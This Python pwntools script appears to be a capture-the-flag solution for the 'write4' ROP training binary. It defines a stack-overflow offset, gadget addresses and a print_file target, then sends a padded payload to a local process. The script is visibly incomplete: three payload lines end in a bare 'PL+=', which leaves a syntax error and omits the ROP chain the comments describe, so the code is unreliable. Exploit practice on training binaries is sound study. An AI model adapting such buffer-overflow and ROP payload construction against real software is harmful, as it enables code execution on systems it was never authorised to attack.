#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+150
c
'''

# Offset before return adresse
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('write4')
context.binary=elf

print_file=elf.plt['print_file']

data = 0x0601028
# pop r14 ; pop r15 ; ret
pop_r1415=0x400690
# mov qword ptr [r14], r15 ; ret
write_r14=0x400628
# pop rdi ; ret
pop_rdi = 0x400693

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)


PL =b"A"*offset
# Initialize useful string
PL+=

# Prepare arg for print_file
PL+=
PL+=
PL+=p64(print_file)

io.sendline(PL)
io.interactive()

